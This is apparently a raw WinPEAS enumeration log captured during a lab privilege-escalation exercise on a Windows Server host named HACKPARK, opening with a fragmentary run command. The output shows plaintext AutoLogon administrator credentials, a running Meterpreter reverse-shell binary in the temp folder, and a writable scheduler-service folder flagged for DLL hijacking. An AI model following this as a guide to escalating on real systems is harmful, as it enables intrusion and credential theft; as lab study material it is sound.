



dling and running winpeas


  Current user: Blog
  Current groups: Everyone, Users, Service, Console Logon, Authenticated Users, This Organization, IIS_IUSRS, Local, S-1-5-82-0


   Computer Name           :   HACKPARK
   User Name               :   Administrator
   User Id                 :   500
   Is Enabled              :   True
   User Type               :   Administrator

   Computer Name           :   HACKPARK
   User Name               :   jeff
   User Id                 :   1001
   Is Enabled              :   True
   User Type               :   User

ÉÍÍÍÍÍÍÍÍÍÍ¹ Ever logged users
    IIS APPPOOL\.NET v4.5 Classic
    IIS APPPOOL\.NET v4.5
    HACKPARK\Administrator
    HACKPARK\jeff

ÉÍÍÍÍÍÍÍÍÍÍ¹ Home folders found
    C:\Users\.NET v4.5
    C:\Users\.NET v4.5 Classic
    C:\Users\Administrator
    C:\Users\All Users
    C:\Users\Default
    C:\Users\Default User
    C:\Users\jeff

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultUserName               :  administrator
    DefaultPassword               :  4q6XvFES7Fdxs

ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Services Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
ÉÍÍÍÍÍÍÍÍÍÍ¹ Interesting Services -non Microsoft-
È Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services                                                        
    Amazon EC2Launch(Amazon Web Services, Inc. - Amazon EC2Launch)["C:\Program Files\Amazon\EC2Launch\EC2Launch.exe" service] - Auto - Stopped
    Amazon EC2Launch
   =================================================================================================                          
    AmazonSSMAgent(Amazon SSM Agent)["C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"] - Auto - Running
    Amazon SSM Agent
   =================================================================================================                          
    AWSLiteAgent(Amazon Inc. - AWS Lite Guest Agent)[C:\Program Files\Amazon\XenTools\LiteAgent.exe] - Auto - Running - No quotes and Space detected                                                                                                        
    AWS Lite Guest Agent
   =================================================================================================                          
    Ec2Config(Amazon Web Services, Inc. - Ec2Config)["C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe"] - Auto - Running - isDotNet
    Ec2 Configuration Service
   =================================================================================================                          
    PsShutdownSvc(Systems Internals - PsShutdown)[C:\Windows\PSSDNSVC.EXE] - Manual - Stopped
   =================================================================================================
    WindowsScheduler(Splinterware Software Solutions - System Scheduler Service)[C:\PROGRA~2\SYSTEM~1\WService.exe] - Auto - Running
    File Permissions: Everyone [WriteData/CreateFiles]
    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\SystemScheduler (Everyone [WriteData/CreateFiles])
    System Scheduler Service Wrapper



```sh
C:\windows\temp\winpeas.exe
c:\windows\system32\inetsrv>C:\windows\temp\winpeas.exe
ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
Long paths are disabled, so the maximum length of a path supported is 260 chars (this may cause false negatives when looking for files). If you are admin, you can enable it with 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
     
               ((((((((((((((((((((((((((((((((                                                                               
        (((((((((((((((((((((((((((((((((((((((((((                                                                           
      ((((((((((((((**********/##########(((((((((((((                                                                        
    ((((((((((((********************/#######(((((((((((                                                                       
    ((((((((******************/@@@@@/****######((((((((((                                                                     
    ((((((********************@@@@@@@@@@/***,####((((((((((                                                                   
    (((((********************/@@@@@%@@@@/********##(((((((((                                                                  
    (((############*********/%@@@@@@@@@/************((((((((                                                                  
    ((##################(/******/@@@@@/***************((((((                                                                  
    ((#########################(/**********************(((((                                                                  
    ((##############################(/*****************(((((                                                                  
    ((###################################(/************(((((                                                                  
    ((#######################################(*********(((((                                                                  
    ((#######(,.***.,(###################(..***.*******(((((                                                                  
    ((#######*(#####((##################((######/(*****(((((                                                                  
    ((###################(/***********(##############()(((((                                                                  
    (((#####################/*******(################)((((((                                                                  
    ((((############################################)((((((                                                                   
    (((((##########################################)(((((((                                                                   
    ((((((########################################)(((((((                                                                    
    ((((((((####################################)((((((((                                                                     
    (((((((((#################################)(((((((((                                                                      
        ((((((((((##########################)(((((((((                                                                        
              ((((((((((((((((((((((((((((((((((((((                                                                          
                 ((((((((((((((((((((((((((((((                                                                               
ADVISORY: winpeas should be used for authorized penetration testing and/or educational purposes only.Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own devices and/or with the device owner´s permission.                                                                                                         
  WinPEAS-ng by @hacktricks_live                                                                                              

       /---------------------------------------------------------------------------------\                                    
       |                             Do you like PEASS?                                  |                                    
       |---------------------------------------------------------------------------------|                                    
       |         Follow on Twitter         :     @hacktricks_live                        |                                    
       |         Respect on HTB            :     SirBroccoli                             |                                    
       |---------------------------------------------------------------------------------|                                    
       |                                 Thank you!                                      |                                    
       \---------------------------------------------------------------------------------/                                    
                                                                                                                              
  [+] Legend:
         Red                Indicates a special privilege over an object or something is misconfigured
         Green              Indicates that some protection is enabled or something is well configured
         Cyan               Indicates active users
         Blue               Indicates disabled users
         LightYellow        Indicates links
 You can find a Windows local PE Checklist here: https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation                                                                                                                       
   Creating Dynamic lists, this could take a while, please wait...                                                            
   - Loading sensitive_files yaml definitions file...
   - Loading regexes yaml definitions file...
   - Checking if domain...
   - Getting Win32_UserAccount info...
   - Creating current user groups list...
  [X] Exception: Object reference not set to an instance of an object.
  [X] Exception: The server could not be contacted.
   - Creating active users list (local only)...
   - Creating disabled users list...
   - Admin users list...
   - Creating AppLocker bypass list...
   - Creating files/directories list for search...
ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ System Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
ÉÍÍÍÍÍÍÍÍÍÍ¹ Basic System Information
È Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#kernel-exploits                                                                                        
    OS Name: Microsoft Windows Server 2012 R2 Standard
    OS Version: 6.3.9600 N/A Build 9600
    System Type: x64-based PC
    Hostname: hackpark
    ProductName: Windows Server 2012 R2 Standard
    EditionID: ServerStandard
    ReleaseId: 
    BuildBranch: 
    CurrentMajorVersionNumber: 
    CurrentVersion: 6.3
    Architecture: AMD64
    ProcessorCount: 2
    SystemLang: en-US
    KeyboardLang: English (United States)
    TimeZone: (UTC-08:00) Pacific Time (US & Canada)
    IsVirtualMachine: False
    Current Time: 6/7/2024 8:07:09 AM
    HighIntegrity: False
    PartOfDomain: False
    Hotfixes: KB2919355, KB2919442, KB2937220, KB2938772, KB2939471, KB2949621, KB3035131, KB3060716, 
  [?] Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson)
ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing All Microsoft Updates
  [X] Exception: Exception has been thrown by the target of an invocation.
ÉÍÍÍÍÍÍÍÍÍÍ¹ System Last Shutdown Date/time (from Registry)
                                                                                                                              
    Last Shutdown Date/time        :    10/2/2020 3:11:01 PM
ÉÍÍÍÍÍÍÍÍÍÍ¹ User Environment Variables
È Check for some passwords or keys in the env variables 
    COMPUTERNAME: HACKPARK
    PUBLIC: C:\Users\Public
    LOCALAPPDATA: C:\Windows\system32\config\systemprofile\AppData\Local
    PSModulePath: C:\Windows\system32\WindowsPowerShell\v1.0\Modules\
    PROCESSOR_ARCHITECTURE: AMD64
    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;
    CommonProgramFiles(x86): C:\Program Files (x86)\Common Files
    ProgramFiles(x86): C:\Program Files (x86)
    PROCESSOR_LEVEL: 6
    ProgramFiles: C:\Program Files
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
    USERPROFILE: C:\Windows\system32\config\systemprofile
    SystemRoot: C:\Windows
    APP_POOL_ID: Blog
    ALLUSERSPROFILE: C:\ProgramData
    APP_POOL_CONFIG: C:\inetpub\temp\apppools\Blog\Blog.config
    FP_NO_HOST_CHECK: NO
    ProgramData: C:\ProgramData
    PROCESSOR_REVISION: 3f02
    USERNAME: HACKPARK$
    CommonProgramW6432: C:\Program Files\Common Files
    CommonProgramFiles: C:\Program Files\Common Files
    OS: Windows_NT
    PROCESSOR_IDENTIFIER: Intel64 Family 6 Model 63 Stepping 2, GenuineIntel
    ComSpec: C:\Windows\system32\cmd.exe
    PROMPT: $P$G
    SystemDrive: C:
    TEMP: C:\Windows\TEMP
    NUMBER_OF_PROCESSORS: 2
    APPDATA: C:\Windows\system32\config\systemprofile\AppData\Roaming
    TMP: C:\Windows\TEMP
    ProgramW6432: C:\Program Files
    windir: C:\Windows
    USERDOMAIN: WORKGROUP
ÉÍÍÍÍÍÍÍÍÍÍ¹ System Environment Variables
È Check for some passwords or keys in the env variables 
    FP_NO_HOST_CHECK: NO
    USERNAME: SYSTEM
    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\
    ComSpec: C:\Windows\system32\cmd.exe
    TMP: C:\Windows\TEMP
    OS: Windows_NT
    windir: C:\Windows
    PROCESSOR_ARCHITECTURE: AMD64
    TEMP: C:\Windows\TEMP
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
    PSModulePath: C:\Windows\system32\WindowsPowerShell\v1.0\Modules\
    NUMBER_OF_PROCESSORS: 2
    PROCESSOR_LEVEL: 6
    PROCESSOR_IDENTIFIER: Intel64 Family 6 Model 63 Stepping 2, GenuineIntel
    PROCESSOR_REVISION: 3f02
ÉÍÍÍÍÍÍÍÍÍÍ¹ Audit Settings
È Check what is being logged 
    Not Found
ÉÍÍÍÍÍÍÍÍÍÍ¹ Audit Policy Settings - Classic & Advanced
ÉÍÍÍÍÍÍÍÍÍÍ¹ WEF Settings
È Windows Event Forwarding, is interesting to know were are sent the logs 
    Not Found
ÉÍÍÍÍÍÍÍÍÍÍ¹ LAPS Settings
È If installed, local administrator password is changed frequently and is restricted by ACL 
    LAPS Enabled: LAPS not installed
ÉÍÍÍÍÍÍÍÍÍÍ¹ Wdigest
È If enabled, plain-text crds could be stored in LSASS https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#wdigest                                                                                                   
    Wdigest is not enabled
ÉÍÍÍÍÍÍÍÍÍÍ¹ LSA Protection
È If enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#lsa-protection          
    LSA Protection is not enabled
ÉÍÍÍÍÍÍÍÍÍÍ¹ Credentials Guard
È If enabled, a driver is needed to read LSASS memory https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#credential-guard                                                                                           
    CredentialGuard is not enabled
  [X] Exception:   [X] 'Win32_DeviceGuard' WMI class unavailable
ÉÍÍÍÍÍÍÍÍÍÍ¹ Cached Creds
È If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#cached-credentials                                                            
    cachedlogonscount is 10
ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating saved credentials in Registry (CurrentPass)
ÉÍÍÍÍÍÍÍÍÍÍ¹ AV Information
  [X] Exception: Invalid namespace 
    No AV was detected!!
    Not Found
ÉÍÍÍÍÍÍÍÍÍÍ¹ Windows Defender configuration
  Local Settings
  Group Policy Settings
ÉÍÍÍÍÍÍÍÍÍÍ¹ UAC Status
È If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access                                                              
    ConsentPromptBehaviorAdmin: 5 - PromptForNonWindowsBinaries
    EnableLUA: 1
    LocalAccountTokenFilterPolicy: 
    FilterAdministratorToken: 0
      [*] LocalAccountTokenFilterPolicy set to 0 and FilterAdministratorToken != 1.
      [-] Only the RID-500 local admin account can be used for lateral movement.                                              
ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 4.0
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: 
    PS history size: 
ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating PowerShell Session Settings using the registry
      You must be an administrator to run this check
ÉÍÍÍÍÍÍÍÍÍÍ¹ PS default transcripts history
È Read the PS history inside these files (if any)
ÉÍÍÍÍÍÍÍÍÍÍ¹ HKCU Internet Settings
    User Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
    IE5_UA_Backup_Flag: 5.0
    ZonesSecurityUpgrade: System.Byte[]
ÉÍÍÍÍÍÍÍÍÍÍ¹ HKLM Internet Settings
    CodeBaseSearchPath: CODEBASE
    EnablePunycode: 1
    WarnOnIntranet: 1
    MinorVersion: 0
    ActiveXCache: C:\Windows\Downloaded Program Files
ÉÍÍÍÍÍÍÍÍÍÍ¹ Drives Information
È Remember that you should search more info inside the other drives 
    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 36 GB)(Permissions: Users [AppendData/CreateDirectories])
ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking WSUS
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#wsus
    Not Found
ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking KrbRelayUp
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#krbrelayup
  The system isn´t inside a domain, so it isn´t vulnerable
ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking If Inside Container
È If the binary cexecsvc.exe or associated service exists, you are inside Docker 
You are NOT inside a container
ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking AlwaysInstallElevated
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated
    AlwaysInstallElevated isn´t available
ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerate LSA settings - auth packages included
                                                                                                                              
    Bounds                               :       00-30-00-00-00-20-00-00
    auditbasedirectories                 :       0
    fullprivilegeauditing                :       00
    crashonauditfail                     :       0
    auditbaseobjects                     :       0
    Security Packages                    :       ""
    LimitBlankPasswordUse                :       1
    NoLmHash                             :       1
    Notification Packages                :       rassfm,scecli
    Authentication Packages              :       msv1_0
    LsaPid                               :       680
    SecureBoot                           :       1
    ProductType                          :       7
    disabledomaincreds                   :       0
    everyoneincludesanonymous            :       0
    forceguest                           :       0
    restrictanonymous                    :       0
    restrictanonymoussam                 :       1
ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating NTLM Settings
  LanmanCompatibilityLevel    :  (Send NTLMv2 response only - Win7+ default)
                                                                                                                              

  NTLM Signing Settings                                                                                                       
      ClientRequireSigning    : False
      ClientNegotiateSigning  : True
      ServerRequireSigning    : False
      ServerNegotiateSigning  : False
      LdapSigning             : Negotiate signing (Negotiate signing)

  Session Security                                                                                                            
      NTLMMinClientSec        : 536870912 (Require 128-bit encryption)
      NTLMMinServerSec        : 536870912 (Require 128-bit encryption)
                                                                                                                              

  NTLM Auditing and Restrictions                                                                                              
      InboundRestrictions     :  (Not defined)
      OutboundRestrictions    :  (Not defined)
      InboundAuditing         :  (Not defined)
      OutboundExceptions      : 
ÉÍÍÍÍÍÍÍÍÍÍ¹ Display Local Group Policy settings - local users/machine
ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking AppLocker effective policy
   AppLockerPolicy version: 1
   listing rules:
ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Printers (WMI)
      Name:                    Microsoft XPS Document Writer
      Status:                  Unknown
      Sddl:                    O:SYD:(A;OIIO;GA;;;CO)(A;OIIO;GA;;;AC)(A;;SWRC;;;WD)(A;CIIO;GX;;;WD)(A;;SWRC;;;AC)(A;CIIO;GX;;;AC)(A;;LCSWDTSDRCWDWO;;;BA)(A;OICIIO;GA;;;BA)
      Is default:              False
      Is network printer:      False
   =================================================================================================
ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Named Pipes
  Name                                                                                                 CurrentUserPerms                                                       Sddl
  CPFATP_812_v4.0.30319                                                                                Blog [WriteData/CreateFiles]                                           O:S-1-5-82-2734256158-3485737692-275298378-1529073857-2789248872G:S-1-5-82-2734256158-3485737692-275298378-1529073857-2789248872D:P(A;;0x12019f;;;BA)(A;;0x12019f;;;S-1-5-82-2734256158-3485737692-275298378-1529073857-2789248872)
  eventlog                                                                                             Everyone [WriteData/CreateFiles]                                       O:LSG:LSD:P(A;;0x12019b;;;WD)(A;;CC;;;OW)(A;;0x12008f;;;S-1-5-80-880578595-1860270145-482643319-2788375705-1540778122)
  iislogpipe5db8fd99-96ad-4163-a447-c6eaa1da9bf7                                                       Blog [AllAccess]                                                       O:S-1-5-82-2734256158-3485737692-275298378-1529073857-2789248872G:S-1-5-82-2734256158-3485737692-275298378-1529073857-2789248872D:P(A;;FA;;;SY)(A;;FA;;;S-1-5-82-2734256158-3485737692-275298378-1529073857-2789248872)
ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating AMSI registered providers
ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Sysmon configuration
      You must be an administrator to run this check
ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Sysmon process creation logs (1)
      You must be an administrator to run this check
ÉÍÍÍÍÍÍÍÍÍÍ¹ Installed .NET versions
                                                                                                                              
  CLR Versions
   4.0.30319

  .NET Versions                                                                                                               
   4.5.51641

  .NET & AMSI (Anti-Malware Scan Interface) support                                                                           
      .NET version supports AMSI     : False
      OS supports AMSI               : False
ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Interesting Events information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
ÉÍÍÍÍÍÍÍÍÍÍ¹ Printing Explicit Credential Events (4648) for last 30 days - A process logged on using plaintext credentials
                                                                                                                              
      You must be an administrator to run this check
ÉÍÍÍÍÍÍÍÍÍÍ¹ Printing Account Logon Events (4624) for the last 10 days.
                                                                                                                              
      You must be an administrator to run this check
ÉÍÍÍÍÍÍÍÍÍÍ¹ Process creation events - searching logs (EID 4688) for sensitive data.
                                                                                                                              
      You must be an administrator to run this check
ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell events - script block logs (EID 4104) - searching for sensitive data.
                                                                                                                              
ÉÍÍÍÍÍÍÍÍÍÍ¹ Displaying Power off/on events for last 5 days
                                                                                                                              
  6/7/2024 4:41:48 AM     :  Startup
ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Users Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
ÉÍÍÍÍÍÍÍÍÍÍ¹ Users
È Check if you have some admin equivalent privileges https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#users-and-groups                                                                                                      
  Current user: Blog
  Current groups: Everyone, Users, Service, Console Logon, Authenticated Users, This Organization, IIS_IUSRS, Local, S-1-5-82-0
   =================================================================================================
    HACKPARK\Administrator: Built-in account for administering the computer/domain
        |->Password: CanChange-Expi-Req
    HACKPARK\Guest(Disabled): Built-in account for guest access to the computer/domain
        |->Password: NotChange-NotExpi-NotReq
    HACKPARK\jeff
        |->Password: NotChange-NotExpi-Req
ÉÍÍÍÍÍÍÍÍÍÍ¹ Current User Idle Time
   Current User   :     IIS APPPOOL\Blog
   Idle Time      :     03h:25m:23s:046ms
ÉÍÍÍÍÍÍÍÍÍÍ¹ Display Tenant information (DsRegCmd.exe /status)
ÉÍÍÍÍÍÍÍÍÍÍ¹ Current Token privileges
È Check if you can escalate privilege using some enabled token https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#token-manipulation                                                                                          
    SeAssignPrimaryTokenPrivilege: DISABLED
    SeIncreaseQuotaPrivilege: DISABLED
    SeAuditPrivilege: DISABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeCreateGlobalPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: DISABLED
ÉÍÍÍÍÍÍÍÍÍÍ¹ Clipboard text
ÉÍÍÍÍÍÍÍÍÍÍ¹ Logged users
    HACKPARK\Administrator
ÉÍÍÍÍÍÍÍÍÍÍ¹ Display information about local users
   Computer Name           :   HACKPARK
   User Name               :   Administrator
   User Id                 :   500
   Is Enabled              :   True
   User Type               :   Administrator
   Comment                 :   Built-in account for administering the computer/domain
   Last Logon              :   6/7/2024 4:42:52 AM
   Logons Count            :   25
   Password Last Set       :   8/3/2019 10:43:23 AM
   =================================================================================================
   Computer Name           :   HACKPARK
   User Name               :   Guest
   User Id                 :   501
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   Built-in account for guest access to the computer/domain
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM
   =================================================================================================
   Computer Name           :   HACKPARK
   User Name               :   jeff
   User Id                 :   1001
   Is Enabled              :   True
   User Type               :   User
   Comment                 :   
   Last Logon              :   8/4/2019 11:54:52 AM
   Logons Count            :   1
   Password Last Set       :   8/4/2019 11:54:00 AM
   =================================================================================================
ÉÍÍÍÍÍÍÍÍÍÍ¹ RDP Sessions
    Not Found
ÉÍÍÍÍÍÍÍÍÍÍ¹ Ever logged users
    IIS APPPOOL\.NET v4.5 Classic
    IIS APPPOOL\.NET v4.5
    HACKPARK\Administrator
    HACKPARK\jeff
ÉÍÍÍÍÍÍÍÍÍÍ¹ Home folders found
    C:\Users\.NET v4.5
    C:\Users\.NET v4.5 Classic
    C:\Users\Administrator
    C:\Users\All Users
    C:\Users\Default
    C:\Users\Default User
    C:\Users\jeff
    C:\Users\Public : Service [WriteData/CreateFiles]
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultUserName               :  administrator
    DefaultPassword               :  4q6XvFES7Fdxs
ÉÍÍÍÍÍÍÍÍÍÍ¹ Password Policies
È Check for a possible brute-force 
    Domain: Builtin
    SID: S-1-5-32
    MaxPasswordAge: 42.22:47:31.7437440
    MinPasswordAge: 00:00:00
    MinPasswordLength: 0
    PasswordHistoryLength: 0
    PasswordProperties: 0
   =================================================================================================
    Domain: HACKPARK
    SID: S-1-5-21-141259258-288879770-3894983326
    MaxPasswordAge: 42.00:00:00
    MinPasswordAge: 00:00:00
    MinPasswordLength: 0
    PasswordHistoryLength: 0
    PasswordProperties: DOMAIN_PASSWORD_COMPLEX
   =================================================================================================
ÉÍÍÍÍÍÍÍÍÍÍ¹ Print Logon Sessions
    Method:                       WMI
    Logon Server:                 
    Logon Server Dns Domain:      
    Logon Id:                     546379
    Logon Time:                   
    Logon Type:                   0
    Start Time:                   12/31/1600 4:00:00 PM
    Domain:                       IIS APPPOOL
    Authentication Package:       
    Start Time:                   12/31/1600 4:00:00 PM
    User Name:                    Blog
    User Principal Name:          
    User SID:                     
   =================================================================================================
ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Processes Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
ÉÍÍÍÍÍÍÍÍÍÍ¹ Interesting Processes -non Microsoft-
È Check if any interesting processes for memory dump or if you could overwrite some binary running https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#running-processes                                                       
    cmd(1804)[C:\Windows\SYSTEM32\cmd.exe] -- POwn: Blog
    Command Line: "cmd.exe"
   =================================================================================================                          
    conhost(2332)[C:\Windows\system32\conhost.exe] -- POwn: Blog
    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
   =================================================================================================
    w3wp(812)[c:\windows\system32\inetsrv\w3wp.exe] -- POwn: Blog
    Command Line: c:\windows\system32\inetsrv\w3wp.exe -ap "Blog" -v "v4.0" -l "webengine4.dll" -a \\.\pipe\iisipmd0633b34-a33d-41ee-9ec0-6e027c41258b -h "C:\inetpub\temp\apppools\Blog\Blog.config" -w "" -m 0 -t 20 -ta 0
   =================================================================================================
    revsh-meterpr-444(3064)[C:\windows\temp\revsh-meterpr-444.exe] -- POwn: Blog
    Permissions: Blog [AllAccess]
    Command Line: C:\windows\temp\revsh-meterpr-444.exe
   =================================================================================================                          
    winpeas(2460)[C:\windows\temp\winpeas.exe] -- POwn: Blog -- isDotNet
    Permissions: Blog [AllAccess]
    Command Line: C:\windows\temp\winpeas.exe
   =================================================================================================                          
ÉÍÍÍÍÍÍÍÍÍÍ¹ Vulnerable Leaked Handlers
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/leaked-handle-exploitation
È Getting Leaked Handlers, it might take some time...
    Handle: 1380(key)
    Handle Owner: Pid is 2460(winpeas) with owner: Blog
    Reason: TakeOwnership
    Registry: HKLM\system\controlset001\control\nls\customlocale
   =================================================================================================
ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Services Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
ÉÍÍÍÍÍÍÍÍÍÍ¹ Interesting Services -non Microsoft-
È Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services                                                        
    Amazon EC2Launch(Amazon Web Services, Inc. - Amazon EC2Launch)["C:\Program Files\Amazon\EC2Launch\EC2Launch.exe" service] - Auto - Stopped
    Amazon EC2Launch
   =================================================================================================                          
    AmazonSSMAgent(Amazon SSM Agent)["C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"] - Auto - Running
    Amazon SSM Agent
   =================================================================================================                          
    AWSLiteAgent(Amazon Inc. - AWS Lite Guest Agent)[C:\Program Files\Amazon\XenTools\LiteAgent.exe] - Auto - Running - No quotes and Space detected                                                                                                        
    AWS Lite Guest Agent
   =================================================================================================                          
    Ec2Config(Amazon Web Services, Inc. - Ec2Config)["C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe"] - Auto - Running - isDotNet
    Ec2 Configuration Service
   =================================================================================================                          
    PsShutdownSvc(Systems Internals - PsShutdown)[C:\Windows\PSSDNSVC.EXE] - Manual - Stopped
   =================================================================================================
    WindowsScheduler(Splinterware Software Solutions - System Scheduler Service)[C:\PROGRA~2\SYSTEM~1\WService.exe] - Auto - Running
    File Permissions: Everyone [WriteData/CreateFiles]
    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\SystemScheduler (Everyone [WriteData/CreateFiles])
    System Scheduler Service Wrapper
   =================================================================================================                          
ÉÍÍÍÍÍÍÍÍÍÍ¹ Modifiable Services
È Check if you can modify any service https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services                                                                                                                             
    You cannot modify any service
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking if you can modify any service registry
È Check if you can modify the registry of a service https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services-registry-permissions                                                                                          
    [-] Looks like you cannot change the registry of any service...
ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking write permissions in PATH folders (DLL Hijacking)
È Check for DLL Hijacking in PATH folders https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dll-hijacking                                                                                                                    
    C:\Windows\system32
    C:\Windows
    C:\Windows\System32\Wbem
    C:\Windows\System32\WindowsPowerShell\v1.0\
ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Applications Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
ÉÍÍÍÍÍÍÍÍÍÍ¹ Current Active Window Application
  [X] Exception: Object reference not set to an instance of an object.
ÉÍÍÍÍÍÍÍÍÍÍ¹ Installed Applications --Via Program Files/Uninstall registry--
È Check if you can modify installed software https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#software                                                                                                                      
    C:\Program Files\Amazon
    C:\Program Files\Common Files
    C:\Program Files\desktop.ini
    C:\Program Files\Internet Explorer
    C:\Program Files\Uninstall Information
    C:\Program Files\Windows Mail
    C:\Program Files\Windows NT
    C:\Program Files\WindowsApps
    C:\Program Files\WindowsPowerShell
ÉÍÍÍÍÍÍÍÍÍÍ¹ Autorun Applications
